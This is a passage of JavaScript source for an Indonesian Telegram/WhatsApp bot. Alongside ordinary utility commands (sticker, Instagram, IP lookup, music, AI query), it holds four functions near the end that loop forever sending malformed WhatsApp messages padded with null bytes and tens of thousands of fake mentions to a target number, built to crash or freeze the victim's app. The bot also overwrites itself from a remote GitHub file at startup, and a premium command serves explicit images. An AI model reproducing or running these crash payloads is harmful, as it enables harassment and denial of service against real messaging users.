            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

// CASE TOOLS
bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
      text
    )}&isVideo=false`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });
    await ctx.replyWithSticker({ source: Buffer.from(res.data) });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    ctx.reply("❌ Gagal membuat stiker brat.");
  }
});

bot.command("iqc", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|ZyuGnteng",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Zyuu Offc ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command("pinterest", async ctx => {
  const q = ctx.message.text.replace("/pinterest ", "")
  if (!q) return ctx.reply("Format: /pinterest kucing")

  const res = await axios.get(
    "https://id.pinterest.com/search/pins/?q=" + encodeURIComponent(q),
    { headers: { "User-Agent": "Mozilla/5.0" } }
  )

  const img = res.data.match(/https:\/\/i\.pinimg\.com\/originals\/[^"]+/)

  ctx.replyWithPhoto(img[0], { caption: q })
})

bot.command("ig", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text)
    return ctx.reply(
      "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/"
    );

  const url = text.trim();

  try {
    const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(
      url
    )}`;

    const res = await fetch(apiUrl);
    const data = await res.json();

    if (!data?.result) {
      return ctx.reply("❌ Failed to fetch Instagram media. Please check the URL.");
    }

    const username = data.result.username || "-";

    if (data.result.video) {
      await ctx.replyWithVideo(data.result.video, {
        caption: `📸 Instagram Media\n\n👤 Author: ${username}`,
      });
    } else if (data.result.image) {
      await ctx.replyWithPhoto(data.result.image, {
        caption: `📸 Instagram Media\n\n👤 Author: ${username}`,
      });
    } else {
      ctx.reply("❌ Unsupported media type from Instagram.");
    }
  } catch (err) {
    console.error("Instagram API Error:", err);
    ctx.reply("❌ Error fetching Instagram media. Please try again later.");
  }
});

bot.command("cekprem", async (ctx) => {
    const userId = ctx.from.id;
    const isPrem = isPremiumUser(userId);
    const premiumUsers = loadPremiumUsers();
    
    let status = isPrem ? '✅ Premium' : '❌ Free User';
    let expired = premiumUsers[userId] || '-';
    let sisaHari = '-';
    
    if (isPrem && premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        const now = moment();
        const diffDays = expiryDate.diff(now, 'days');
        sisaHari = diffDays > 0 ? `${diffDays} hari` : 'Hari ini expired';
    }
    
    const user = ctx.from;
    const username = user.username ? `@${user.username}` : "Tidak ada";
    
    ctx.reply(`
╭──〔 𝘾𝙀𝙆 𝙎𝙏𝘼𝙏𝙐𝙎 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 〕
│ ⌬ User : ${user.first_name}
│ ⌬ Username : ${username}
│ ⌬ ID : ${userId}
│ ⌬ Status : ${status}
│ ⌬ Expired : ${expired}
│ ⌬ Sisa Hari : ${sisaHari}
╰────────────
    `, { parse_mode: 'HTML' });
});

// ============ CEK SENDER WHATSAPP ============
bot.command("ceksender", async (ctx) => {
    const chatId = ctx.chat.id;
    
    const status = isWhatsAppConnected ? '✅ Terhubung' : '❌ Tidak Terhubung';
    const number = linkedWhatsAppNumber || 'Belum ada nomor';
    
    let socketInfo = 'Tidak aktif';
    let credsInfo = 'Tidak tersedia';
    
    try {
        if (sock) {
            socketInfo = '✅ Aktif';
            if (sock.authState && sock.authState.creds) {
                const creds = sock.authState.creds;
                const me = creds.me || {};
                const platform = creds.platform || 'Unknown';
                const device = creds.device || 'Unknown';
                
                credsInfo = `📱 Device: ${device}\n💻 Platform: ${platform}`;
                
                if (me && me.id) {
                    const jid = me.id.split(':')[0] || me.id;
                    number = jid;
                }
            }
        }
    } catch (e) {
        socketInfo = '❌ Error';
    }
    
    let pairingNumber = 'Tidak ada';
    if (lastPairingMessage && lastPairingMessage.phoneNumber) {
        pairingNumber = lastPairingMessage.phoneNumber;
    }
    
    ctx.reply(`
╭──〔 𝘾𝙀𝙆 𝙎𝙀𝙉𝘿𝙀𝙍 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋 〕
│ ⌬ Status : ${status}
│ ⌬ Socket : ${socketInfo}
│ ⌬ Nomor : ${number}
│ ⌬ Pairing : ${pairingNumber}
│ ⌬ Linked : ${linkedWhatsAppNumber || 'Belum ada'}
│
│ ⌬ Info Creds :
│ ${credsInfo}
╰────────────
    `, { parse_mode: 'HTML' });
});

bot.command("cekall", async (ctx) => {
    const userId = ctx.from.id;
    const user = ctx.from;
    const username = user.username ? `@${user.username}` : "Tidak ada";
    
    const isPrem = isPremiumUser(userId);
    const premiumUsers = loadPremiumUsers();
    let statusPrem = isPrem ? '✅ Premium' : '❌ Free User';
    let expired = premiumUsers[userId] || '-';
    let sisaHari = '-';
    
    if (isPrem && premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        const diffDays = expiryDate.diff(moment(), 'days');
        sisaHari = diffDays > 0 ? `${diffDays} hari` : 'Hari ini expired';
    }
    
    const statusSender = isWhatsAppConnected ? '✅ Terhubung' : '❌ Tidak Terhubung';
    let number = linkedWhatsAppNumber || 'Belum ada nomor';
    
    try {
        if (sock && sock.authState && sock.authState.creds && sock.authState.creds.me) {
            const me = sock.authState.creds.me;
            if (me && me.id) {
                number = me.id.split(':')[0] || me.id;
            }
        }
    } catch (e) {}
    
    // RUNTIME
    const runtime = formatRuntime();
    const memory = formatMemory();
    
    ctx.reply(`
╭──〔 𝘾𝙀𝙆 𝙎𝙀𝙈𝙐𝘼 〕
│
├──〔 𝙐𝙎𝙀𝙍 〕
│ ⌬ ID : ${userId}
│ ⌬ Username : ${username}
│ ⌬ Nama : ${user.first_name}
│
├──〔 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 〕
│ ⌬ Status : ${statusPrem}
│ ⌬ Expired : ${expired}
│ ⌬ Sisa : ${sisaHari}
│
├──〔 𝙎𝙀𝙉𝘿𝙀𝙍 〕
│ ⌬ Status : ${statusSender}
│ ⌬ Nomor : ${number}
│
├──〔 𝙎𝙔𝙎𝙏𝙀𝙈 〕
│ ⌬ Runtime : ${runtime}
│ ⌬ Memory : ${memory}
╰────────────
    `, { parse_mode: 'HTML' });
});

bot.command("info", (ctx) => {
  const u = ctx.from;

  const info = `
🪪 <b>Your Profile Info</b>
━━━━━━━━━━━━━━━━━━
👤 Name: ${u.first_name || "-"} ${u.last_name || ""}
🏷 Username: @${u.username || "None"}
🆔 ID: <code>${u.id}</code>
🌐 Language: ${u.language_code || "unknown"}
`;

  ctx.reply(info, { parse_mode: "HTML" });
});

bot.command("gempa", async (ctx) => {
  try {
    const res = await fetch(
      "https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json"
    );
    const data = await res.json();
    const g = data.Infogempa.gempa;

    const info = `
📢 *Latest Earthquake (BMKG)*
📅 Date: ${g.Tanggal}
🕒 Time: ${g.Jam}
📍 Location: ${g.Wilayah}
📊 Magnitude: ${g.Magnitude}
📌 Depth: ${g.Kedalaman}
🌊 Potential: ${g.Potensi}
🧭 Coordinates: ${g.Coordinates}
🗺️ Felt: ${g.Dirasakan || "-"}
`;

    await ctx.reply(info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Failed to fetch earthquake data.");
  }
});
bot.command('cekidch', async (ctx) => {
  const args = ctx.message.text.split(" ");
  
  // Cek input
  if (args.length < 2) return ctx.reply("❌ Format salah! /cekidch <link_channel>");
  
  const link = args[1];

  // Validasi link channel WA
  if (!link.includes("https://whatsapp.com/channel/")) {
    return ctx.reply("❌ Link channel tidak valid!");
  }

  try {
    // Ambil kode undangan dari link
    const inviteCode = link.split("https://whatsapp.com/channel/")[1];

    // Ambil metadata channel WA via Baileys
    const res = await sock.newsletterMetadata("invite", inviteCode);

    // Format teks hasil
    const teks = `
📡 *Data Channel WhatsApp*
━━━━━━━━━━━━━━━━━━
🆔 *ID:* ${res.id}
📛 *Nama:* ${res.name}
👥 *Total Pengikut:* ${res.subscribers}
📊 *Status:* ${res.state}
✅ *Verified:* ${res.verification === "VERIFIED" ? "Terverifikasi" : "Belum Verif"}
`;

    // Kirim balasan ke Telegram
    await ctx.reply(teks, { parse_mode: "Markdown" });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal mengambil data channel. Pastikan link benar dan WA bot online.");
  }
});
bot.command("shortlink", async (ctx) => {
  const url = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!url) {
    return ctx.reply(
      "🔗 Send the link you want to shorten!\n\nExample:\n`/shortlink https://example.com/very/long/link`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const res = await fetch(
      `https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`
    );
    const shortUrl = await res.text();

    if (!shortUrl || !shortUrl.startsWith("http")) {
      throw new Error("Shorten failed");
    }

    await ctx.reply(
      `✅ *Link shortened!*\n\n🔹 Original: ${url}\n🔹 Short: ${shortUrl}`,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    console.error("Shortlink error:", err);
    ctx.reply("⚠️ Failed to shorten link. Try again later.");
  }
});

bot.command("trackip", async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
⫹⫺ - IP: ${data.ip || "-"}
⫹⫺ - Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
⫹⫺ - Region: ${data.region || "-"}
⫹⫺ - City: ${data.city || "-"}
⫹⫺ - ZIP: ${data.postal || "-"}
⫹⫺ - Timezone: ${data.timezone_gmt || "-"}
⫹⫺ - ISP: ${data.isp || "-"}
⫹⫺ - Org: ${data.org || "-"}
⫹⫺ - ASN: ${data.asn || "-"}
⫹⫺ - Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailUrl !== "undefined" && thumbnailUrl) {
        await ctx.replyWithPhoto(thumbnailUrl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 ☇ Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

const listHentai = [
  {"url": "https://files.catbox.moe/5wt81f.jpg"},
  {"url": "https://files.catbox.moe/xdqj22.jpg"},
  {"url": "https://files.catbox.moe/lvafhj.jpg"},
  {"url": "https://files.catbox.moe/em6j1f.jpg"},
  {"url": "https://files.catbox.moe/5bgyld.jpg"},
  {"url": "https://files.catbox.moe/orafro.jpg"},
  {"url": "https://files.catbox.moe/lcm9x3.jpg"},
  {"url": "https://files.catbox.moe/x3ux77.jpg"},
  {"url": "https://files.catbox.moe/f5ucmj.jpg"},
  {"url": "https://files.catbox.moe/djq46h.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/w0225y.jpg"},
  {"url": "https://files.catbox.moe/fqm5fg.jpg"},
  {"url": "https://files.catbox.moe/itv3b0.jpg"},
  {"url": "https://files.catbox.moe/s45bdq.jpg"},
  {"url": "https://files.catbox.moe/omhwvo.jpg"},
  {"url": "https://files.catbox.moe/8eaqrj.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/e99emf.jpg"}
]

bot.command('hentai', checkPremium, async (ctx) => {
  const loadingMsg = await ctx.reply('🔄 Loading hentai...');
  
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  const pick = getRandom();
  
  try {
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI ERROR]', err.message);
    await ctx.editMessageText('❌ Gagal mengirim hentai. Coba lagi nanti.', {
      chat_id: ctx.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});

bot.action('hentai_next', async (ctx) => {
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  
  try {
    await ctx.answerCbQuery();
    
    const loadingMsg = await ctx.reply('🔄 Loading hentai berikutnya...');
    await ctx.deleteMessage();
    
    const pick = getRandom();
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai selanjutnya untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI NEXT ERROR]', err.message);
    await ctx.answerCbQuery('❌ Error loading hentai', { show_alert: true });
  }
});
const videoList = [
  {"url": "https://files.catbox.moe/8c7gz3.mp4"},
  {"url": "https://files.catbox.moe/nk5l10.mp4"},
  {"url": "https://files.catbox.moe/r3ip1j.mp4"},
  {"url": "https://files.catbox.moe/71l6bo.mp4"},
  {"url": "https://files.catbox.moe/rdggsh.mp4"},
  {"url": "https://files.catbox.moe/3288uf.mp4"},
  {"url": "https://files.catbox.moe/jdopgq.mp4"},
  {"url": "https://files.catbox.moe/8ca9cw.mp4"},
  {"url": "https://files.catbox.moe/b99qh3.mp4"},
  {"url": "https://files.catbox.moe/6bkokw.mp4"},
  {"url": "https://files.catbox.moe/ebisdh.mp4"},
  {"url": "https://files.catbox.moe/3yko44.mp4"},
  {"url": "https://files.catbox.moe/apqlvo.mp4"},
  {"url": "https://files.catbox.moe/wqe1r7.mp4"},
  {"url": "https://files.catbox.moe/nk5l10.mp4"},
  {"url": "https://files.catbox.moe/8c7gz3.mp4"},
  {"url": "https://files.catbox.moe/wqe1r7.mp4"},
  {"url": "https://files.catbox.moe/n37liq.mp4"},
  {"url": "https://files.catbox.moe/0728bg.mp4"},
  {"url": "https://files.catbox.moe/p69jdc.mp4"},
  {"url": "https://files.catbox.moe/occ3en.mp4"},
  {"url": "https://files.catbox.moe/y8hmau.mp4"},
  {"url": "https://files.catbox.moe/tvj95b.mp4"},
  {"url": "https://files.catbox.moe/3g2djb.mp4"},
  {"url": "https://files.catbox.moe/xlbafn.mp4"}
  // ... tambahkan yang lain
]


bot.command("ai", async (ctx) => {
  const userId = ctx.from.id
  const query = ctx.message.text.split(" ").slice(1).join(" ")

  if (!query) {
    return ctx.reply("Contoh penggunaan:\n/ai siapa presiden indonesia")
  }

  const now = Date.now()

  // cooldown 5 detik
  if (cooldown[userId] && now - cooldown[userId] < 5000) {
    return ctx.reply("Tunggu 5 detik sebelum pakai lagi")
  }

  // cek request sebelumnya
  if (processing[userId]) {
    return ctx.reply("Tunggu, request sebelumnya masih diproses")
  }

  cooldown[userId] = now
  processing[userId] = true

  try {
    await ctx.reply("Sabar Biar Gwa Mikir Dulu...")

    let hasil = await aiPerplexity(query)

    if (hasil.length > 4000) {
      hasil = hasil.slice(0, 4000) + "..."
    }

    await ctx.reply(hasil)

  } catch (err) {
    await ctx.reply("Terjadi error: " + err.message)
  } finally {
    processing[userId] = false
  }
})

// CASE REQ FITUR + SPOTIFY + AI
const memeks = [
  "spotify",
  "ytmusic",
  "joox",
  "soundcloud",
  "deezer",
  "applemusic",
  "amazonmusic",
  "kiw",
  "audiomack",
  "resso",
  "play",
  "ytplay",
  "ytmp3",
  "song",
  "music"
]

// ambil command regex
const kwontol = new RegExp(`^\\/(${memeks.join("|")})\\s+(.+)`, "i")

async function fetchAPI(query) {
  try {
    const url = `http://api.ikyyxd.my.id/search/spotifyplay?query=${encodeURIComponent(query)}`

    const res = await axios.get(url, {
      timeout: 15000,
      validateStatus: () => true
    })

    if (res.status !== 200 || !res.data?.status) {
      return null
    }

    return res.data.result

  } catch (err) {
    console.log("API ERROR:", err.message)
    return null
  }
}

async function sendAudioSafe(ctx, data) {
  try {
    return await ctx.replyWithAudio(
      { url: data.download },
      {
        title: data.title || "Unknown",
        performer: data.artist || "Unknown",
        caption:
`🎵 ${data.title || "Unknown"}
👤 ${data.artist || "Unknown"}
⏱ ${data.duration || "Unknown"}`
      }
    )

  } catch (err) {

    return await ctx.replyWithDocument(
      { url: data.download },
      {
        caption:
`🎵 ${data.title || "Unknown"}
👤 ${data.artist || "Unknown"}`
      }
    )
  }
}

// handler command
bot.hears(kwontol, async (ctx) => {
  try {
    const text = ctx.message.text
    const match = text.match(kwontol)

    if (!match) return

    const cmd = match[1]
    const query = match[2]

    await ctx.sendChatAction("upload_document")

    const data = await fetchAPI(query)

    if (!data || !data.download) {
      return ctx.reply(`❌ (${cmd}) Lagu tidak ditemukan`)
    }

    await sendAudioSafe(ctx, data)

  } catch (err) {
    console.log("ERROR:", err.message)
    ctx.reply("❌ Gagal kirim audio")
  }
})

// anti crash
process.on("unhandledRejection", (err) => {
  console.log("UNHANDLED:", err)
})

process.on("uncaughtException", (err) => {
  console.log("CRASH:", err)
})

const processing = {}

async function aiPerplexity(query) {
  try {
    const url = "http://api.ikyyxd.my.id/ai/perplexity?query=" + encodeURIComponent(query)
    
    const res = await axios.get(url)

    return res.data.result || JSON.stringify(res.data)
  } catch (err) {
    return "Terjadi error: " + err.message
  }
}

//FUNC AMPAS LO TARO DISIN
async function delayInvisible(sock, target) {
  while (true) {
    try {
      await sock.relayMessage(target, {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "ATX"
              },
              nativeFlowMessage: {
                buttons: [{}]
              },
              contextInfo: {
                urlTrackingMap: {
                  urlTrackingMapElements: Array.from({ length: 500000 }, (_, z) => ({
                    participant: `62${z + 720599}@s.whatsapp.net`
                  }))
                }
              }
            }
          }
        }
      }, {
        participant: { jid: target }
      });

    } catch (e) {}
  }
}


async function iosFreeze(sock, target) {
  while (true) {
    try {
      let anjay = "ZyuStecuAbiezz" + "ြ".repeat(25000) + "@1".repeat(60000);
      await sock.relayMessage(target, {
        extendedTextMessage: {
          text: anjay,
          contextInfo: {
            mentionedJid: Array.from({ length: 99999 }, () => `62${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net`),
            isForwarded: true,
            forwardingScore: 9999999999,
            participant: target
          }
        },
        documentMessage: {
          url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
          mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          fileLength: "999999999",
          pageCount: 0x9184e729fff,
          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          fileName: "NtahMengapa..",
          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
          mediaKeyTimestamp: "1715880173",
          contactVcard: true
        },
        interactiveMessage: {
          body: {
            text: anjay + "\0".repeat(500000)
          },
          footer: {
            text: "\0".repeat(500000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "payment_info",
                buttonParamsJson: "\u0000".repeat(500000) + "\x10".repeat(500000)
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "\0".repeat(500000),
                  url: "https://t.me/ZyuuOffc" + "\0".repeat(500000) + ".com"
                })
              }
            ],
            messageParamsJson: "\0".repeat(500000)
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 99999 }, () => `62${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net`),
            isForwarded: true,
            forwardingScore: 9999999999,
            participant: target,
            stickerPackId: "\0".repeat(500000) + "𑇂𑆵𑆴𑆿".repeat(500000)
          }
        }
      }, {
        participant: { jid: target }
      });

    } catch (e) {}
  }
}

async function ComingForYouAtx(sock, target) {
  while (true) {
    try {
      await sock.relayMessage(target, {
        interactiveMessage: {
          body: {
            text: "ATX IS HERE" + "\0".repeat(500000)
          },
          footer: {
            text: "\0".repeat(500000)
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: "\u0000".repeat(999999) },
              { name: "quick_reply", buttonParamsJson: "\u0000".repeat(999999) },
              { name: "cta_url", buttonParamsJson: "\u0000".repeat(999999) },
              { name: "cta_call", buttonParamsJson: "\u0000".repeat(999999) },
              { name: "cta_copy", buttonParamsJson: "\u0000".repeat(999999) },
              { name: "single_select", buttonParamsJson: "\u200B".repeat(999999) },
              { name: "single_select", buttonParamsJson: "A".repeat(999999) },
              { name: "single_select", buttonParamsJson: "\u0000".repeat(999999) }
            ],
            messageParamsJson: "\0".repeat(500000)
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 99999 }, () => `62${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net`),
            isForwarded: true,
            forwardingScore: 9999999999,
            participant: target,
            stickerPackId: "\0".repeat(500000) + "𑇂𑆵𑆴𑆿".repeat(500000)
          }
        }
      }, {
        participant: { jid: target }
      });

    } catch (e) {}
  }
}

async function BlankStc(sock, target) {
  while (true) {
    try {
      await sock.relayMessage(target, {
        interactiveMessage: {
          body: {
            text: "\u200b".repeat(60000) + "\0".repeat(500000)
          },
          footer: {
            text: "\0".repeat(500000)
          },
          nativeFlowMessage: {
            buttons: "booking_number".repeat(20000) + "\0".repeat(50000)
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 99999 }, () => `62${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net`),
            isForwarded: true,
            forwardingScore: 9999999999,
            participant: target,
            stickerPackId: "\0".repeat(500000) + "𑇂𑆵𑆴𑆿".repeat(500000)
          }
        },
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
          fileLength: "10610",
          mediaKeyTimestamp: "1775044724",
          stickerSentTs: "1775044724091",
          isAnimated: true,
          contextInfo: {
            mentionedJid: Array.from({ length: 99999 }, () => `62${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net`),
            isForwarded: true,
            forwardingScore: 9999999999,
            participant: target
          }
        }
      }, {
        participant: { jid: target }
      });

    } catch (e) {}
  }
}


//

const GITHUB_RAW_URL = "https://raw.githubusercontent.com/ZyuuKnowxy/Zyyx/main/main.js";

async function checkAndUpdateOnStart() {
    try {
        console.log("🔄 Mengecek update versi terbaru...");
        
        const { data: latest } = await axios.get(GITHUB_RAW_URL, {
            timeout: 15000,
            headers: { 'User-Agent': 'Mozilla/5.0' }
        });

        const currentFile = fs.existsSync(__filename) ? fs.readFileSync(__filename, 'utf8') : "";

        const currentHash = crypto.createHash('md5').update(currentFile).digest('hex');
        const latestHash = crypto.createHash('md5').update(latest).digest('hex');

        if (currentHash !== latestHash) {
            console.log("🔄 Update tersedia! Mengupdate otomatis...");
            
            if (fs.existsSync(__filename)) {
                const backup = fs.readFileSync(__filename, 'utf8');
                fs.writeFileSync(__filename + '.backup', backup);
                console.log("✅ Backup dibuat: " + __filename + '.backup');
            }

            fs.writeFileSync(__filename, latest);
            console.log("✅ Update berhasil! File terbaru diterapkan.");

            try {
                await bot.telegram.sendMessage(ownerID, `
🔄 *AUTO UPDATE BERHASIL!*
━━━━━━━━━━━━━━━━━━━━━━
📂 File: ${path.basename(__filename)}
📦 Size: ${(latest.length / 1024).toFixed(2)} KB
⏰ Waktu: ${new Date().toLocaleString()}
💡 Bot akan restart otomatis.
                `, { parse_mode: 'Markdown' });
            } catch (e) {}

            console.log("🔄 Restarting bot...");
            setTimeout(() => {
                process.exit(0);
            }, 2000);

        } else {
            console.log("✅ Bot sudah versi terbaru.");
        }

    } catch (err) {
        console.log("⚠️ Gagal cek update:", err.message);
    }
}

(async () => {
    await checkAndUpdateOnStart();
})();

bot.launch()
